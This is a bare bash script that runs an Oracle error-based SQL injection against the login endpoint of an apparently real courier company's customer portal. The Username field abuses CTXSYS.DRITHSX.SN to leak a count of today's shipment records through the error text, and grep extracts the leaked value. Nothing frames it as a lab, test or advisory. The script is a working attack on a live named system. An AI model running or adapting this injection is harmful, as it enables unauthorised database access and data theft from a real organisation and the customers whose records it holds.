#!/bin/bash
curl -k -s -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM EMS.SHIPMENT WHERE TRUNC(CREATE_DATE)=TRUNC(SYSDATE))))||'"'"'","Password":"test"}' 2>&1 | grep -oP 'thesaurus \K[^" ]+' | head -1
